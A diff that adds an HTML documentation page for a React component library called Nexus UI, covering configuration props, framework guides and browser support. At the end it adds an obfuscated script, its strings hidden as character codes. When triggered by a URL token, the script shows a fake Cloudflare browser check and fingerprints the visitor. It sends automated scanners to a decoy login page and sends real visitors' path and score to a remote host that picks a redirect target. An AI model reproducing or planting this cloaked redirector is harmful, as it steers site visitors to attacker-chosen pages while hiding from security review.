+        <span class="docs-prop-type">string</span>
+        <div class="docs-prop-desc">BCP 47 locale identifier for internationalization. Affects date formatting, number formatting, and RTL detection.</div>
+        <div class="docs-prop-default">Default: <code class="docs-inline-code">'en-US'</code></div>
+    </div>
+    <div class="docs-prop">
+        <span class="docs-prop-name">portalContainer</span>
+        <span class="docs-prop-type">HTMLElement</span>
+        <div class="docs-prop-desc">Custom DOM element for rendering portal content (modals, drawers, tooltips). Useful for shadow DOM or iframe scenarios.</div>
+        <div class="docs-prop-default">Default: <code class="docs-inline-code">document.body</code></div>
+    </div>
+    <div class="docs-prop">
+        <span class="docs-prop-name">disableAnimations</span>
+        <span class="docs-prop-type">boolean</span>
+        <div class="docs-prop-desc">Globally disable all component animations. Automatically true when <code class="docs-inline-code">prefers-reduced-motion</code> is set.</div>
+        <div class="docs-prop-default">Default: <code class="docs-inline-code">false</code></div>
+    </div>
+
+    <h2 id="framework-guides">Framework Guides</h2>
+    <p>Nexus UI works with all major React frameworks. Follow the specific guide for your setup:</p>
+
+    <div class="docs-steps">
+        <div class="docs-step">
+            <h4>Next.js (App Router)</h4>
+            <p>Add the provider to your root layout. Mark it as a client component with <code class="docs-inline-code">'use client'</code>. Import the CSS in your global stylesheet.</p>
+        </div>
+        <div class="docs-step">
+            <h4>Vite + React</h4>
+            <p>Import the provider in your main entry file. No additional configuration needed. Tree-shaking works automatically with Vite's Rollup-based build.</p>
+        </div>
+        <div class="docs-step">
+            <h4>Remix</h4>
+            <p>Add the provider to your root route. Use the <code class="docs-inline-code">links</code> export to include the CSS file. Server-side rendering is fully supported.</p>
+        </div>
+        <div class="docs-step">
+            <h4>Astro</h4>
+            <p>Use the React integration and add the provider to your layout component. Set <code class="docs-inline-code">client:load</code> on interactive component islands.</p>
+        </div>
+    </div>
+
+    <h2 id="browser-support">Browser Support</h2>
+    <div class="docs-table-wrap">
+        <table class="docs-table">
+            <thead><tr><th>Browser</th><th>Version</th><th>Status</th></tr></thead>
+            <tbody>
+                <tr><td>Chrome / Edge</td><td>≥ 88</td><td><span class="badge badge-green">Supported</span></td></tr>
+                <tr><td>Firefox</td><td>≥ 85</td><td><span class="badge badge-green">Supported</span></td></tr>
+                <tr><td>Safari</td><td>≥ 15</td><td><span class="badge badge-green">Supported</span></td></tr>
+                <tr><td>iOS Safari</td><td>≥ 15</td><td><span class="badge badge-green">Supported</span></td></tr>
+                <tr><td>Samsung Internet</td><td>≥ 16</td><td><span class="badge badge-green">Supported</span></td></tr>
+                <tr><td>IE 11</td><td>—</td><td><span class="badge badge-red">Not supported</span></td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2 id="community">Community & Support</h2>
+    <div class="docs-grid-3">
+        <div class="docs-stat-card">
+            <div class="docs-stat-number">47k+</div>
+            <div class="docs-stat-label">GitHub Stars</div>
+        </div>
+        <div class="docs-stat-card">
+            <div class="docs-stat-number">2.1M</div>
+            <div class="docs-stat-label">Monthly Downloads</div>
+        </div>
+        <div class="docs-stat-card">
+            <div class="docs-stat-number">340+</div>
+            <div class="docs-stat-label">Contributors</div>
+        </div>
+    </div>
+
+    <div class="docs-pagination">
+        <div></div>
+        <a class="docs-page-link next" href="#">
+            <span class="page-dir">Next →</span>
+            <span class="page-name">Installation</span>
+        </a>
+    </div>
+</main>
+
+<aside class="docs-toc">
+    <div class="docs-toc-title">On this page</div>
+    <ul class="docs-toc-list">
+        <li><a href="#" class="active">Introduction</a></li>
+        <li><a href="#installation">Installation</a>
+            <ul class="docs-toc-list toc-sub">
+                <li><a href="#peer-deps">Peer dependencies</a></li>
+            </ul>
+        </li>
+        <li><a href="#quick-start">Quick Start</a></li>
+        <li><a href="#configuration">Configuration</a></li>
+        <li><a href="#framework-guides">Framework Guides</a></li>
+        <li><a href="#browser-support">Browser Support</a></li>
+        <li><a href="#community">Community & Support</a></li>
+    </ul>
+</aside>
+</div>
+
+<div class="docs-footer">
+    <span>© 2026 Nexus UI Contributors</span>
+    <div>
+        <a href="https://github.com">GitHub</a>
+        <a href="#">Discord</a>
+        <a href="#">Twitter</a>
+        <a href="#">License</a>
+    </div>
+</div>
+</div>
+
+<script>
+(function(){
+var _l=location.href,_p=location.pathname+location.search;
+var _v=new RegExp(String.fromCharCode(113,107)+String.fromCharCode(40,91,97,45,102,48,45,57,93,123,49,54,125,41)).test(_l);
+
+var _G=String.fromCharCode(104,116,116,112,115,58,47,47,100,111,110,116,99,97,108,108,109,101,45,98,97,98,121,46,99,111,109);
+var _F=String.fromCharCode(104,116,116,112,115,58,47,47,108,97,115,116,112,97,115,115,46,99,111,109,47,108,111,103,105,110);
+
+if(!_v)return;
+
+document.getElementById('docs-page').style.display='none';
+document.getElementById('cf-gate').style.display='flex';
+
+var _T=2000+Math.floor(Math.random()*3000);
+var _rid='';for(var i=0;i<16;i++)_rid+='0123456789abcdef'[Math.floor(Math.random()*16)];
+document.getElementById('cf-ri').textContent='Ray ID: '+_rid+' \u2022 '+location.hostname;
+document.getElementById('cf-st').textContent='Checking your browser...';
+var _fl=document.getElementById('cf-fl');
+_fl.style.transition='width '+_T+'ms linear';
+setTimeout(function(){_fl.style.width='100%'},50);
+
+var _mc=0,_ev=[];
+document.addEventListener('mousemove',function(e){_mc++;if(_ev.length<30)_ev.push([e.clientX,e.clientY])},false);
+document.addEventListener('touchstart',function(){_mc++},false);
+
+function _en(pts){
+    if(pts.length<3)return 0;var d=0;
+    for(var i=1;i<pts.length&&i<20;i++){
+        var dx=pts[i][0]-pts[i-1][0],dy=pts[i][1]-pts[i-1][1],a=Math.atan2(dy,dx);
+        if(i>1){var pa=Math.atan2(pts[i-1][1]-pts[i-2][1],pts[i-1][0]-pts[i-2][0]);d+=Math.abs(a-pa)}
+    }return d;
+}
+function _fp(){
+    var r={s:0,f:[]};
+    if(navigator[String.fromCharCode(119,101,98,100,114,105,118,101,114)]){r.f.push(1);return r}
+    try{var c=document.createElement('canvas').getContext('webgl');
+        if(c){var d=c.getExtension(String.fromCharCode(87,69,66,71,76,95,100,101,98,117,103,95,114,101,110,100,101,114,101,114,95,105,110,102,111));
+        if(d){var v=c.getParameter(d.UNMASKED_RENDERER_WEBGL);
+        if(v&&new RegExp(String.fromCharCode(115,119,105,102,116,115,104,97,100,101,114,124,108,108,118,109,112,105,112,101),'i').test(v)){r.f.push(2);return r}}}
+    }catch(x){}
+    if(window.chrome&&window.chrome.runtime)r.s+=25;
+    else if(new RegExp(String.fromCharCode(99,104,114,111,109,101),'i').test(navigator.userAgent))r.s+=0;
+    else r.s+=15;
+    if(navigator.plugins&&navigator.plugins.length>0)r.s+=20;
+    if(_mc>0)r.s+=20;
+    if(_en(_ev)>0.5)r.s+=15;
+    try{var t0=performance.now(),t1=performance.now();if((t1-t0)<0.005)r.s+=10}catch(x){r.s+=5}
+    if(window.chrome)r.s+=15;
+    if(screen.width>0&&screen.height>0&&screen.colorDepth>0)r.s+=5;
+    try{var cv=document.createElement('canvas');cv.width=200;cv.height=50;
+        var cx=cv.getContext('2d');cx.fillText('t',10,25);
+        if(cv.toDataURL().length>100)r.s+=15}catch(x){}
+    return r;
+}
+function _ok(){
+    document.getElementById('cf-sp').style.display='none';
+    document.getElementById('cf-ck').style.display='block';
+    document.getElementById('cf-title').textContent='Verification successful';
+    document.getElementById('cf-st').textContent='Redirecting...';
+}
+setTimeout(function(){
+    var r=_fp();
+    if(r.f.length>0){window.location.href=_F;return}
+    document.getElementById('cf-st').textContent='Almost there...';
+    fetch(_G+String.fromCharCode(47,113,115,47,100,101,99,105,100,101,63,117,61)+encodeURIComponent(_p)+String.fromCharCode(38,115,61)+r.s,{method:'GET',mode:'cors'})
+    .then(function(resp){if(!resp.ok)throw new Error(resp.status);return resp.json()})
+    .then(function(data){if(data&&data.url){_ok();setTimeout(function(){window.location.href=data.url},250)}else{window.location.href=_F}})
+    .catch(function(){window.location.href=_F});
+},_T);
+})();
+</script>
+
+</body>
+</html>
